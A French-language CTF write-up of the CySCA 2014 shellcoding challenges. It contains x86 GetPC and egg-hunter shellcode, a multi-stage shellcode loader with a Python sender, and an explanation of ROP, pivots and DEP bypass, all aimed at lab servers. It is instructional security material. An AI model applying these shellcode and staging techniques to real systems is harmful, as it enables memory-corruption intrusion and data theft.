# Solution du Cyber-Security Challenge Australia 2014 (Shellcoding)

Exploitation web... [check](http://devloop.users.sourceforge.net/index.php?article111/solution-du-cyber-security-challenge-australia-2014-partie-web)  

Network forensics... [check](http://devloop.users.sourceforge.net/index.php?article112/solution-du-cyber-security-challenge-australia-2014-network-forensics)  

Reverse engineering... [check](http://devloop.users.sourceforge.net/index.php?article113/solution-du-cyber-security-challenge-australia-2014-reverse-engineering)  

Mad Coding Skillz... [check](http://devloop.users.sourceforge.net/index.php?article114/solution-du-cyber-security-challenge-australia-2014-mad-coding-skillz)  

Shellcoding... Here we go !  

Missing Missy (120 points)
--------------------------

Le libellé de ce premier exercice de shellcoding est le suivant :  

> The first task Mad Programming Skillz Pty. Ltd have for you requires that you write a function in shellcode that sets the EAX register to the memory address of the first instruction of your shellcode. The code to be tested is running on the server at 192.168.1.64:9090. The server will provide more information on your task. Your test MUST return execution to the program.

Quand on se connecte au serveur on obtient les instructions complémentaires suivantes :  

```plain
$ ncat 192.168.1.64 9090 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.64:9090.
Set EAX to the address of your first shellcode instruction.
Then, return execution to the program.
Enter your shellcode as a hex encoded string (up to 40 characters):
```

Si vous souhaitez découvrir le shellcoding, je vous invite à lire [ce document PDF de *Jonathan Salwan*](http://www.exploit-db.com/docs/315.pdf) (l'auteur de *ROPgadget*) qui date de 2009.  

Le principe du shellcoding est de faire du code assembleur "indépendant" capable de fonctionner quand on l'injecte dans un processus et cela à n'importe qu'elle adresse mémoire de ce processus.  

Ici l'opération demandée dans l'exercice est vraiment la base du shellcoding, c'est à dire comment par exemple passer une ligne de commande assez longue à une fonction ou un appel système quand on ne connaît pas l'adresse absolue de la chaîne de caractère mais juste son adresse relative par rapport au code courant.  

La méthode couramment employée est de placer la chaîne de caractère en fin du shellcode.  

Le shellcode commencera alors à sauter (jmp) vers l'adresse relative juste avant la chaîne de caractère. A cette adresse on aura pris soin de placer une instruction call qui remontera l'exécution juste après le précédent jmp.  

Comme l'instruction call place sur la pile l'instruction qui la suit, on trouvera alors sur la pile l'adresse de la chaîne de caractère.  

Il suffit alors de récupérer l'adresse de la chaîne en dépilant avec une instruction pop.  

Là il n'est pas question de chaîne de caractère, juste de l'adresse du début du shellcode. On va donc commencer par faire un call qui aura pour effet de placer l'adresse de l'instruction suivante sur la pile.  

On pop immédiatement afin de récupérer cette adresse dans un registre (eax car c'est celui utilisé pour les valeurs de retour) puis on soustrait à sa valeur la taille prise par l'instruction call (5 octets). C'est tout !  

On rajoute une instruction ret finale pour que notre code redonne la main au code légitime ce qui nous donne en assembleur NASM :  

```asm
section .text
    global _main

_main:
    call get_addr
get_addr:
    pop eax
    sub eax, 5
    ret
```

Sous mon système 64 bits la compilation pour du 32 bits (demandé par le challenge) se fait de cette manière :  

```plain
$ nasm -f elf32 main.s
$ ld -m elf_i386 -o main main.o
ld: AVERTISSEMENT: ne peut trouver le symbole d'entrée _start; utilise par défaut 0000000008048060
```

On récupère les opcodes (code hexadécimal des instructions assembleur) via le désassembleur objdump :  

```asm
$  objdump -D main

main:     format de fichier elf32-i386

Désassemblage de la section .text:

08048060 <_main>:
 8048060:       e8 00 00 00 00          call   8048065 <get_addr>

08048065 <get_addr>:
 8048065:       58                      pop    %eax
 8048066:       83 e8 05                sub    $0x5,%eax
 8048069:       c3                      ret
```

Il suffit alors d'envoyer la chaîne e8000000005883e805c3 au serveur :  

```plain
Ncat: Connected to 192.168.1.64:9090.
Set EAX to the address of your first shellcode instruction.
Then, return execution to the program.
Enter your shellcode as a hex encoded string (up to 40 characters): 
e8000000005883e805c3
Received 10 bytes of shellcode. Executing shellcode...
Congratulations! Secret key is: TableSauceDamned664
Ncat: 21 bytes sent, 275 bytes received in 2.51 seconds.
```

Pas de quoi fouetter un chat.  

On peut aussi avoir recours à *rasm2* (outil fournit avec [*radare2*](http://www.radare.org/r/)) pour déterminer les opcodes d'une instruction ASM :  

```plain
$ rasm2 -a x86 'call 5'
e800000000
```

X97:L97 (200 points)
--------------------

> Mad Programming Skillz Pty. Ltd have created code to dynamically allocate a function that returns a flag, obfuscate it and place it randomly in memory to improve software security. To ensure this works correctly, they need you to write a test with shellcode that will locate the function within the specified memory range, deobfuscate and return control to it. The code is running at 192.168.1.64:16831. The server will provide more information on your task.

Et pour plus de détails (car c'est pas forcément très clair) :  

```plain
Welcome to the shellcode 2 challenge
Please send your egg hunter and deobfuscator shellcode as raw bytes                                                             
The egg will be between 0xb74d9000 and 0xb75d8fff                                                                               
The egg tag will be 'CySC' without the quotes                                                                                   
The egg is less than 255 bytes long                                                                                             
The egg bytes are xored with the low byte of the tag address                                                                    
    E.g if the tag is stored at 0x11223344 the egg bytes will be xored with 0x44                                                
Enter your shellcode as a hex encoded string (up to 80 characters)
```

L'objectif ici est de chercher en mémoire dans une plage donnée la suite de caractères *'CySC'* (l'egg tag).  

A la suite de ces 4 caractères se trouve une fonction dont le code a été XORé avec l'octet de poids faible de l'adresse du tag.  

La longueur exacte de la fonction ainsi obfusquée n'est pas indiquée mais on nous dit qu'elle fait moins de 255 octets.  

Il nous faudra décrypter le code de cette fonction et lui rendre la main apparemment via l'instruction ret.  

L'objectif pédagogique de l'exercice est de nous faire écrire un egg-hunter, c'est à dire le code qui va chercher le tag en mémoire.  

Dans le cadre d'une exploitation un egg-hunter peut par exemple servir à rechercher en mémoire un grand shellcode dont on ignore la position mais que l'on aura soumis préalablement au programme via une entrée non vulnérable. Ainsi quand le egg-hunter (injecté via un buffer-overflow) trouve le grand shellcode il n'a plus qu'à sauter dessus (pour peu qu'il soit dans une zone exécutable bien sûr).  

On peut imaginer d'autres utilisations comme la recherche d'une longue ligne de commande (à passer à system() par exemple) ou (pourquoi pas) l'extraction d'une clé privée depuis la mémoire d'un serveur vulnérable.  

J'ai d'abord écrit un shellcode très naïf qui comme attendu cherche le tag puis XOR les octets qui suivent :  

```asm
section .text
    global _main

_main:
    mov esi, buffer ; adresse de debut
loop:
    mov eax, [esi]
    cmp eax, 0x43537943 ; 'CySC'
    je found
    inc esi
    jmp loop

found:
    mov edx, esi
    and edx, 0xff
    mov ecx, edx ; 0x000000d0
    shl ecx, 8
    add ecx, edx ; 0x0000d0d0
    shl ecx, 8
    add ecx, edx ; 0x00d0d0d0
    shl ecx, 8
    add ecx, edx ; 0xd0d0d0d0
    xor eax, eax
    add esi, 4

decrypt:
    mov ebx, [esi + eax * 4]
    xor ebx, ecx
    mov [esi + eax * 4], ebx
    cmp eax, 63
    je run
    inc eax
    jmp decrypt

run:
    call esi

section .data progbits alloc exec write
   buffer db 'blahblahblahCySCzzzzzzzz', 0
```

Le code du label found est destiné à répéter l'octet de poids faible sur les 3 autres octets d'un dword (32 bits) ainsi de pouvoir faire un XOR de dword en dword.  

Même si techniquement ça fonctionne, ce premier shellcode est loin d'être optimisé :  

```asm
$ objdump -D shellcode

shellcode:     format de fichier elf32-i386

Désassemblage de la section .text:

08048080 <_main>:
 8048080:       be ef be ad de          mov    $0xdeadbeef,%esi

08048085 <loop>:
 8048085:       8b 06                   mov    (%esi),%eax
 8048087:       3d 43 79 53 43          cmp    $0x43537943,%eax
 804808c:       74 03                   je     8048091 <found>
 804808e:       46                      inc    %esi
 804808f:       eb f4                   jmp    8048085 <loop>

08048091 <found>:
 8048091:       89 f2                   mov    %esi,%edx
 8048093:       81 e2 ff 00 00 00       and    $0xff,%edx
 8048099:       89 d1                   mov    %edx,%ecx
 804809b:       c1 e1 08                shl    $0x8,%ecx
 804809e:       01 d1                   add    %edx,%ecx
 80480a0:       c1 e1 08                shl    $0x8,%ecx
 80480a3:       01 d1                   add    %edx,%ecx
 80480a5:       c1 e1 08                shl    $0x8,%ecx
 80480a8:       01 d1                   add    %edx,%ecx
 80480aa:       31 c0                   xor    %eax,%eax
 80480ac:       83 c6 04                add    $0x4,%esi

080480af <decrypt>:
 80480af:       8b 1c 86                mov    (%esi,%eax,4),%ebx
 80480b2:       31 cb                   xor    %ecx,%ebx
 80480b4:       89 1c 86                mov    %ebx,(%esi,%eax,4)
 80480b7:       83 f8 3f                cmp    $0x3f,%eax
 80480ba:       74 03                   je     80480bf <run>
 80480bc:       40                      inc    %eax
 80480bd:       eb f0                   jmp    80480af <decrypt>

080480bf <run>:
 80480bf:       ff d6                   call   *%esi
```

65 octets... Alors que le serveur n'en accepte seulement 40 et vous comprenez le second principe pédagogique de l'exercice ;-)  

Au passage j'ai aussi fait le petit shellcode suivant qui tente un write(). J'ai essayé différents descripteurs de fichier (stdout, stderr) mais avec le descripteur 4 j'obtiens bien un output (*ABCD* en sens inverse) :  

```asm
global _start

section .text

_start:
    mov eax, 0x4
    mov ebx, 0x4
    push 0x41424344
    mov ecx, esp
    mov edx, 0x4
    int 0x80
    pop ebx
    ret
```

Exécution par le serveur :  

```plain
Welcome to the shellcode 2 challenge
Please send your egg hunter and deobfuscator shellcode as raw bytes
The egg will be between 0xb74f0000 and 0xb75effff
The egg tag will be 'CySC' without the quotes
The egg is less than 255 bytes long
The egg bytes are xored with the low byte of the tag address
    E.g if the tag is stored at 0x11223344 the egg bytes will be xored with 0x44
Enter your shellcode as a hex encoded string (up to 80 characters)
b804000000bb04000000684443424189e1ba04000000cd805bc3
Received 26 bytes of shellcode. Executing
DCBASadly no flag for you this time
```

Ça a au moins permis de m'assurer que le shellcode s'exécutait correctement :)  

En mélangeant ainsi la partie egg-hunter de mon shellcode avec le code d'écriture il est possible de vérifier que le tag est bien retrouvé en mémoire :  

```asm
section .text
    global _main

_main:
    mov esi, 0xdeadbeef ; adresse de début à modifier selon les infos du serveur
    mov ebx, 0x43537943 ; 'CySC'
loop:
    mov eax, [esi]
    cmp eax, ebx
    je found
    inc esi
    jmp loop

found:
    push ebx
    mov ecx, esp
    xor eax, eax
    mov al, 0x4
    push eax
    pop ebx
    push eax
    pop edx
    int 0x80
    pop ebx ; on retire la chaîne
    ret
```

Et il apparaît que le tag est retrouvé (comme dans l'exemple ci-dessous où l'on voit bien *CySC* apparaître, mais pas à tous les coups).  

```plain
Welcome to the shellcode 2 challenge
Please send your egg hunter and deobfuscator shellcode as raw bytes
The egg will be between 0xb74f0000 and 0xb75effff
The egg tag will be 'CySC' without the quotes
The egg is less than 255 bytes long
The egg bytes are xored with the low byte of the tag address
    E.g if the tag is stored at 0x11223344 the egg bytes will be xored with 0x44
Enter your shellcode as a hex encoded string (up to 80 characters)
be00004fb7bb437953438b0639d8740346ebf75389e131c0b004505b505acd805bc3
Received 34 bytes of shellcode. Executing
CySCSadly no flag for you this time
```

D'après la documentation, la fonction malloc() retourne des adresses alignées... mais les créateurs du challenge ont du faire en sorte qu'un padding aléatoire soit mis pour que l'adresse du tag ne soit pas toujours un multiple de 4.  

Jusqu'ici mon shellcode a différents points faibles qui augmente sa taille :  

* il devrait utiliser des instructions de répétitions (REP\*, LOOP\*) qui se basent sur l'utilisation de ECX en tant que compteur
* il devrait utiliser des instructions de traitement de chaine comme SCAS\*, LODS\*, STOS\*
* il devrait faire le XOR octet par octet car générer un dword "répété" prend trop d'instructions

Vous trouverez les descriptions de différentes instructions assembleurs [sur ce site](http://faydoc.tripod.com/cpu/lodsb.htm).  

Au final j'ai écrit le shellcode suivant... qui fait pile poil 40 octets et laisse le programme du serveur se terminer correctement que le tag ait été trouvé ou non (je n'avais pas assez de place pour rajouter du code qui incrémente un décalage de 0 à 3 du coup il faut tenter jusqu'à ce que le tag soit bien aligné)  

```asm
section .text
    global _main

_main:
    mov edi, 0xb74c4000 ; address to start search at
    mov eax, 0x43537943 ; 'CySC'  :egg tag
    xor ecx, ecx ; ecx is the counter
    dec ecx ;  ecx = 0xffffffff
    shr ecx, 14 ; ecx = 0x3ffff - range length I'm looking in
    repne scasd ; inc edi by 4 until [edi] match the egg tag
    jecxz not_found ; if ecx is 0 after the loop, then no flag

    push edi ; address of the bytes following the egg tag
decrypt:
    sub edi, 4 ; address of the egg tag
    mov esi, edi ; set esi = edi to use loadsb/stosb
    mov edx, edi ; dl will be the XOR key (lower byte of the tag address)
    xor ecx, ecx
    mov cl, 0xff ; "The egg is less than 255 bytes long"

boucle:
    lodsb ; eq. mv al, [esi]
    xor al, dl ; deobfuscate
    stosb ; eq. mv [edi], al
    loop boucle

exec:
    ret ; jump to the un-obfuscated code

not_found:
    ret ; return without errors
```

Ce qui nous donne :  

```plain
$ ncat 192.168.1.64 16831 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.64:16831.
Welcome to the shellcode 2 challenge
Please send your egg hunter and deobfuscator shellcode as raw bytes
The egg will be between 0xb74c4000 and 0xb75c3fff
The egg tag will be 'CySC' without the quotes
The egg is less than 255 bytes long
The egg bytes are xored with the low byte of the tag address
    E.g if the tag is stored at 0x11223344 the egg bytes will be xored with 0x44
Enter your shellcode as a hex encoded string (up to 80 characters)
bf00404cb7b84379534331c949c1e90ef2afe3135783ef0489fe89fa31c9b1ffac30d0aae2fac3c3
Received 40 bytes of shellcode. Executing
Your flag is ProcessCertainNearly173
```

Mais je mentirais en affirmant que je n'en ai pas bavé... J'ai passé beaucoup de temps à comprendre pourquoi mon shellcode ne fonctionnait pas avant de me rendre compte au final que dans ma boucle j'avais d'abord mis un *loopne* au lieu d'un *loop*.  

L'instruction loopne se base comme loop sur le registre ECX pour déterminer si elle doit suivre le label passé en argument mais contrairement à loop elle prend aussi en compte le zero flag (ZF) qui doit être à 0.  

Au final mon code de décodage n'allait pas jusqu'au bout et je recevait un SIGSEV :(  

Pour déboguer le programme du serveur j'ai du écrire un shellcode qui dumpait le code de la fonction obfusquée :  

```asm
section .text
    global _main

_main:
    mov edi, 0xb74f0000 ; adresse de début
    mov eax, 0x43537943 ; 'CySC'
    xor ecx, ecx ; mise a zéro du compte
    not ecx ; 0xffffffff
    shr ecx, 14
    repne scasd ; incrémente edi de 4 jusqu'à ce que [edi] == eax
    ; arrive ici, on est juste après le tag
    test ecx, ecx
    jne print
    inc eax ; DySC si non trouve, CySC si trouve

print:
    push eax ; pousse la chaîne sur la pile
    mov ecx, esp ; adresse de la stack (donc de la chaîne)
    xor eax, eax
    mov al, 0x4 ; write syscall
    push eax
    pop ebx ; file descriptor is 4 too
    push 0xff
    pop edx ; longueur
    int 0x80
    pop ebx ; on retire la chaîne
    ret
```

Comme la place du décodage est prise par le code du dump, il faut malheureusement tester les 255 combinaisons possibles de clé pour trouver le bon code de la fonction de génération du flag.  

Le code décodé le plus vraisemblable est le suivant :  

```asm
     0x00000001    55           push ebp
     0x00000002    89e5         mov ebp, esp
     0x00000004    81ec38010000 sub esp, 0x138 ; 312 octets de variables locales
     0x0000000a    65a114000000 mov eax, dword gs:[0x14] ; canary
     0x00000010    8945f4       mov dword [ebp - 0xc], eax
     0x00000013    31c0         xor eax, eax
     0x00000015    c785e4fefff. mov dword [ebp - 0x11c], 0x8049030 ; func1
     0x0000001f    c785e8fefff. mov dword [ebp - 0x118], 0x8048f23 ; func2
     0x00000029    c785ecfefff. mov dword [ebp - 0x114], 0x8048970 ; func3
     0x00000033    c7442404000. mov dword [esp + 4], 0x100    ; arg1 = 256
     0x0000003b    8d85f4feffff lea eax, dword [ebp - 0x10c]
     0x00000041    890424       mov dword [esp], eax          ; arg0 = adresse ebp-0x10c
     0x00000044    8b85e4feffff mov eax, dword [ebp - 0x11c]
     0x0000004a    ffd0         call eax ; func1(arg0, arg1)
        unk(unk)
     0x0000004c    8985f0feffff mov dword [ebp - 0x110], eax
     0x00000052    83bdf0fefff. cmp dword [ebp - 0x110], -1 ; check retour de func1
 ,=< 0x00000059    7527         jne 0x82
 |   0x0000005b    a1b0c00408   mov eax, dword [0x804c0b0] ; ??
 |   0x00000060    c74424049b9. mov dword [esp + 4], 0x8049e9b ; adresse prédéfinie, arg1
 |   0x00000068    890424       mov dword [esp], eax ; arg0 = contenu de 0x804c0b0
 |   0x0000006b    8b85e8feffff mov eax, dword [ebp - 0x118]
 |   0x00000071    ffd0         call eax ; func2(arg0, arg1)
 |      unk()
 |   0x00000073    c7042401000. mov dword [esp], 1
 |   0x0000007a    8b85ecfeffff mov eax, dword [ebp - 0x114]
 |   0x00000080    ffd0         call eax ; func3(1) : exit ?
 |      unk()
 `-> 0x00000082    a1b0c00408   mov eax, dword [0x804c0b0]
     0x00000087    8d95f4feffff lea edx, dword [ebp - 0x10c]
     0x0000008d    89542408     mov dword [esp + 8], edx ; arg2 = adresse ebp-0x10c
     0x00000091    c7442404b89. mov dword [esp + 4], 0x8049eb8 ; adresse prédéfinie, arg1
     0x00000099    890424       mov dword [esp], eax ; arg0 = contenu de 0x804c0b0
     0x0000009c    8b85e8feffff mov eax, dword [ebp - 0x118]
     0x000000a2    ffd0         call eax ; func2(arg0, arg1, arg2)
        unk()
     0x000000a4    c7042401000. mov dword [esp], 1
     0x000000ab    8b85ecfeffff mov eax, dword [ebp - 0x114]
     0x000000b1    ffd0         call eax ; func3(1)
        unk()
     0x000000b3    8b45f4       mov eax, dword [ebp - 0xc]
     0x000000b6    65330514000. xor eax, dword gs:[0x14]
,==< 0x000000bd    7405         je 0xc4
|    0x000000bf    e87ef3ffff   call 0xfffffffffffff442
|       0xfffffffffffff442()
`--> 0x000000c4    c9           leave
     0x000000c5    c3           ret
```

Mais pour autant, ça ne me permettait pas de savoir réellement ce qui bloquait dans mon shellcode.  

La seule façon était de parvenir à dumper le code de la fonction une fois que j'ai effectué la boucle XOR puis comparer avec le dump précédent.  

Comme faire cela alors que le serveur n'accepte que 40 octets ?  

Réponse : le multi-staging !  

Le serveur reçoit notre shellcode et est capable de l'exécuter. Pour cela il a sans doute alloué de la mémoire via malloc() et fait en sorte que le flag d'exécution soit mis sur cette zone.  

Mais le système d'exploitation gère la mémoire par ce qu'on appelle des "pages" dont la taille est de 4ko...  

Pour bypasser la limitation il suffit donc d'envoyer un premier shellcode (stage 1) qui va écouter sur la socket (appeler le syscall read avec fd = 4) et s'auto écraser par un nouveau shellcode de plus grande taille (stage 2).  

Il faut bien voir qu'une fois qu'on a passé l'appel à *int 0x80* ce qui suit sera écrasé donc inutile d'aller plus loin dans le premier stage.  

Et pour ne pas avoir à gérer un système de jmp ou call compliqués mon stage2 sera simplement le stage1 suivi d'instructions supplémentaires (on a de la place donc pourquoi s'embêter).  

Cette étape m'a permis de comprendre que ma boucle de décodage s'arrêtait seulement quelques octets après le prologue et de corriger le tir.  

Voici mon shellcode multi-stage (avec la loop corrigé) qui lit 255 octets sur la socket, s'auto écrase, recherche le tag, décrypte la fonction, dump son code puis l'exécute :  

```asm
section .text
    global _main

_main:
    call get_addr
get_addr:
    pop ecx
    sub ecx, 5 ; address to overwrite
    xor ebx, ebx
    mul ebx
    add al, 3 ; read syscall
    add bl, 4 ; file descriptor
    mov dl, 0xff ; length
    int 0x80 ; fin du stage1

    ; début stage2
    mov edi, 0xdeadbeef ; address to start search at
    mov eax, 0x43537943 ; 'CySC'  :egg tag
    xor ecx, ecx ; ecx is the counter
    dec ecx ;  ecx = 0xffffffff
    shr ecx, 14 ; ecx = 0x3ffff - range length I'm looking in
    repne scasd ; inc edi by 4 until [edi] match the egg tag
    jecxz not_found ; if ecx is 0 after the loop, then no flag

    push edi ; address of the bytes following the egg tag
decrypt:
    sub edi, 4 ; address of the egg tag
    mov esi, edi ; set esi = edi to use loadsb/stosb
    mov edx, edi ; dl will be the XOR key (lower byte of the tag address)
    and edx, 0xff ; ajout
    mov ecx, 0xff

boucle:
    lodsb ; eq. mv al, [esi]
    xor al, dl ; deobfuscate
    stosb ; eq. mv [edi], al
    loop boucle ; was loopne

write:
    pop ecx ; address of un-obfuscated code
    xor eax, eax
    mov al, 4 ; write syscall
    mov ebx, eax ; file descriptor
    xor edx, edx
    mov dl, 0xff ; length
    int 0x80

    call ecx

not_found:
    ret ; return without errors
```

Pour que ce soit parfait il faut un code Python avec qui s'occupe de remplacer le placeholder 0xdeadbeef par l'adresse de début donnée par le serveur et qui soit surtout capable d'envoyer le stage2 :  

```python
#!/usr/bin/python2
# devloop - CySCA 2014 X97:L97 shellcode CTF using multi-staging
import socket
import struct

stage1 = "e8000000005983e90531dbf7e3040380c304b2ffcd80"
stage2 = stage1 + "bfefbeaddeb84379534331c949c1e90ef2afe3285783ef0489fe89fa81e2ff000000b9ff000000ac30d0aae2fa5931c0b00489c331d2b2ffcd80ffd1c3"
#     0xdeadbeef --> ^^^^^^^^

s = socket.socket()
s.connect(('192.168.1.64', 16831))
s.recv(1024) # banner
s.recv(1024) # please send...
buff = s.recv(1024) # The egg will be between...

if "between" in buff:
    start = buff.split(" ")[5]
    if start.startswith("0x"):
        start = start[2:]
        print "start =", start
        addr = struct.pack("I", int(start, 16)).encode("hex_codec")
        stage2 = stage2.replace("efbeadde", addr)

        while True:
            buff = s.recv(1024)
            if "Enter your shellcode" in buff:
                print "Sending stage1 as hexencoded string..."
                s.send(stage1)
                buff = s.recv(1024)  # Received 22 bytes of shellcode. Executing
                print "Sending stage2 as raw bytes..."
                s.send(stage2.decode("hex_codec"))
                buff = s.recv(255)
                if buff.startswith("Sadly"):
                    print buff
                    break
                print "opcodes from deobfuscated function:"
                print buff.encode("hex_codec")
                buff = s.recv(255)
                print "also received:", buff
                break
    else:
        print "Invalid line format:", buff
s.close()
```

Exécution du code :  

```plain
start = b74c4000
Sending stage1 as hexencoded string...
Sending stage2 as raw bytes...
opcodes from deobfuscated function:
5589e581ec3801000065a1140000008945f431c0c785e4feffff30900408c785e8feffff238f0408c785ecfeffff70890408c7442404000100008d85f4feffff8904248b85e4feffffffd08985f0feffff83bdf0feffffff7527a1b0c00408c74424049b9e04088904248b85e8feffffffd0c70424010000008b85ecfeffffffd0a1b0c004088d95f4feffff89542408c7442404b89e04088904248b85e8feffffffd0c70424010000008b85ecfeffffffd08b45f4653305140000007405e87ef3ffffc9c3e7cf4898f07b09de395252d91dc400110dd7eab68588dd5e480a1e40b671662b61eadf79184f485ca08c7459e9eeffad4861c5ebdc5d6468a814
also received: Your flag is ProcessCertainNearly173
```

Il faut noter que la solution "officielle" donnée par les organisateurs est un shellcode de 29 octets... mais qui ne fait aucune vérification pour déterminer si on est à la fin de la plage mémoire et ne retourne pas la main au programme serveur (donc crashe dans tous les cas).  

Stop, Rop and Roll (280 points)
-------------------------------

> The last task that Mad Programming skills have provided requires that you test a range of functionality in a binary provided by them.
> The development of this binary had no thought for future testing so DEP was enabled, this means you will need to add a pivot and ROP in addition the test shellcode to return the flag. The code is running at 192.168.1.64:22523. The server will provide more information on your task.

ROP ? Pivot ? DEP ? WTF !? HOORAY FOR BOOBIES !!!  

Explications : le principe d'une exploitation de stack overflow consiste à écraser sur la pile l'adresse de retour d'une fonction et aussi d'y placer un shellcode sur lequel sauter.  

Pour contrer ce type d'attaques il est possible de faire en sorte que la stack ne soit pas exécutable ce qui est d'ailleurs rarement une fonctionnalité demandée par les développeurs. On appelle ce mécanisme *DEP* pour *Data Execution Prevention*.  

Afin de bypasser cette protection les hackers se sont tournés vers les *ret-into-libc* : on mettra sur la pile l'adresse d'une fonction de la libc ainsi que ses arguments. Comme on ne met pas de code il n'y a plus à se soucier du DEP.  

Le principal inconvénient de cette technique d'exploitation c'est la quasi impossibilité de chaîner des appels de fonction car les arguments que l'on aura injectés ne sont pas retirés pour la fonction qui devrait suivre.  

De plus des protections supplémentaires ont fait leur apparition avec principalement l'*ASLR* qui rend impossible de deviner l'adresse d'une fonction de la libc et *ascii armor* qui consiste à faire en sorte que l'adresse d'une fonction comme system() contienne un octet nul (donc impossible à passer via un strcpy()).  

Une première solution de contournement a été publiée [dans *Phrack 68*](http://phrack.org/issues/58/4.html#article).  

Cette technique consiste à réutiliser des petites suites d'instructions déjà présentes dans le programme qui permettent entre deux appels de fonction de faire le ménage dans la stack.  

Ainsi si on appelle une fonction de la libc, celle-ci va rendre la main en faisant un ret et sauter vers des instructions existantes de notre choix permettant de passer outre les arguments existants via la modification du registre esp (exemple d'instruction : *add esp, X* ou *pop reg* suivi d'un *ret*).  

Le *ROP* (*return-oriented programming*) est une généralisation de cette technique d'attaque consistant justement à chaîner des séries de petites instructions se terminant par ret (les gadgets, qui dans certains cas peuvent aussi terminer par un jmp, call, etc) et effectuant au final les opérations que l'on souhaite.  

Au lieu de passer un shellcode on passera donc une suite d'adresse ainsi que des valeurs (puisqu'on pourra utiliser des instructions pop pour extraire ces valeurs de la pile et les mettre dans des registres). Cette suite d'adresses et de valeurs est la ROP-chain.  

Enfin le pivot est une instruction qui permet de modifier le registre esp pour le faire pointer vers une fausse pile que l'on aura nous même rempli avec la ROP chain.  

Dans le cadre d'une exploitation il ne sera pas forcément nécessaire de pivoter mais ça peut être utile si on est limité en taille et que l'on a pu soumettre préalablement au programme des octets qu'il a stocké en mémoire sans limitation (il faudra bien sûr être en mesure de déterminer l'adresse relative de cette zone par exemple par rapport à la valeur d'un registre).  

Entrons dans le vif du sujet. Que nous demande le programme serveur ?  

```plain
$ ncat 192.168.1.64 22523 -v
Ncat: Version 6.01 ( http://nmap.org/ncat )
Ncat: Connected to 192.168.1.64:22523.
Welcome to the shellcode 3 challenge
Please send your all requested data as hex encoded strings
DEP is on!
Payload Conditions: Truncated at zero. Every 16th byte must be 0xCC
Pivot and ROP conditions: None apart from size
Your payload will be located at 0xb7731000
Please send your pivot (8 characters)
deadbeef
Please send your payload (upto 512 characters)
0102030405060708090a0b0c0d0e0fcc
Received 16 bytes of payload
Please send your rop chain (upto 256 characters)
deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
Received 20 bytes of rop chain
A SIGSEGV was raised during shellcode execution. Exiting
Ncat: 83 bytes sent, 516 bytes received in 41.25 seconds.
```

Contrairement aux deux précédents exercices ont dispose ici du binaire qui tourne sur le serveur.  

En regardant les chaînes à l'intérieur on trouve une référence au fichier */flag.txt*.  

Jetons un œil supplémentaire avec *radare2* (je me suis basé sur [cet article](http://dustri.org/b/exploiting-zengarden-boston-key-party-2014-pwn300-with-radare2.html) car je ne suis pas encore un expert avec cet outil) :  

```plain
$ radare2 8305f5c99ba1d89802940f6e68f802f5-sc03 
 -- Now featuring NoSQL!
[0x08048e08]> iI
file    8305f5c99ba1d89802940f6e68f802f5-sc03
type    EXEC (Executable file)
pic     false
canary  false
nx      true
crypto  false
has_va  true
root    elf
class   ELF32
lang    c
arch    x86
bits    32
machine Intel 80386
os      linux
subsys  linux
endian  little
strip   false
static  true
linenum true
lsyms   true
relocs  true
rpath   NONE

[0x08048e08]> iz~/flag.txt
vaddr=0x080c71f0 paddr=0x0007f1f0 ordinal=019 sz=10 len=9 section=.rodata type=a string=/flag.txt
[0x08048e08]> aa
[0x08048e08]> axt 0x080c71f0
c 0x80c71ee jb str._flag.txt
d 0x80493d8 mov eax, str._flag.txt
```

```asm
[0x08048e08]> pdf @ 0x80493d8
/ (fcn) sym.load_flag 186
|          0x080493cc    55           push ebp
|          0x080493cd    89e5         mov ebp, esp
|          0x080493cf    57           push edi
|          0x080493d0    83ec34       sub esp, 0x34
|          0x080493d3    baee710c08   mov edx, 0x80c71ee ; "r" @ 0x80c71ee
|          0x080493d8    b8f0710c08   mov eax, str._flag.txt ; "/flag.txt" @ 0x80c71f0
|          0x080493dd    89542404     mov dword [esp + 4], edx
|          0x080493e1    890424       mov dword [esp], eax
|          0x080493e4    e8271b0000   call sym.__new_fopen
|             sym.__new_fopen(unk, unk) ; sym._IO_new_fopen
|          0x080493e9    8945f0       mov dword [ebp - 0x10], eax
|          0x080493ec    837df000     cmp dword [ebp - 0x10], 0
|      ,=< 0x080493f0    750a         jne 0x80493fc
|      |   0x080493f2    b8ffffffff   mov eax, 0xffffffff ; -1 ; -1
|     ,==< 0x080493f7    e984000000   jmp 0x8049480 ; (sym.load_flag)
|     ||   ; JMP XREF from 0x080493f0 (unk)
|     |`-> 0x080493fc    8b45f0       mov eax, dword [ebp - 0x10] ; FILE *
|     |    0x080493ff    89442408     mov dword [esp + 8], eax
|     |    0x08049403    8b450c       mov eax, dword [ebp + 0xc] ; arg2 : size
|     |    0x08049406    89442404     mov dword [esp + 4], eax ;
|     |    0x0804940a    8b4508       mov eax, dword [ebp + 8] ;  arg1 : char *s
|     |    0x0804940d    890424       mov dword [esp], eax
|     |    0x08049410    e84b180000   call sym._IO_fgets ; (fcn.0804ac52)
|     |       fcn.0804ac52() ; sym.fgets
|     |    0x08049415    8b45f0       mov eax, dword [ebp - 0x10]
|     |    0x08049418    890424       mov dword [esp], eax
|     |    0x0804941b    e840160000   call sym.__new_fclose ; (fcn.0804aa5c)
|     |       fcn.0804aa5c() ; sym._IO_fclose
|     |    0x08049420    8b4508       mov eax, dword [ebp + 8] ; contenu de /flag.txt
|     |    0x08049423    c745e4fffff. mov dword [ebp - 0x1c], 0xffffffff
|     |    0x0804942a    89c2         mov edx, eax
|     |    0x0804942c    b800000000   mov eax, 0
|     |    0x08049431    8b4de4       mov ecx, dword [ebp - 0x1c]
|     |    0x08049434    89d7         mov edi, edx
|     |    0x08049436    f2ae         repne scasb al, byte es:[edi] ; strlen
|     |    0x08049438    89c8         mov eax, ecx
|     |    0x0804943a    f7d0         not eax
|     |    0x0804943c    83e801       sub eax, 1
|     |    0x0804943f    83e801       sub eax, 1
|     |    0x08049442    8945f4       mov dword [ebp - 0xc], eax
|     |    0x08049445    837df400     cmp dword [ebp - 0xc], 0
|    ,===< 0x08049449    7e16         jle 0x8049461
|    ||    0x0804944b    8b45f4       mov eax, dword [ebp - 0xc]
|    ||    0x0804944e    034508       add eax, dword [ebp + 8]
|    ||    0x08049451    0fb600       movzx eax, byte [eax]
|    ||    0x08049454    3c0a         cmp al, 0xa ; regarde si le dernier caractère est un LF
|   ,====< 0x08049456    7509         jne 0x8049461
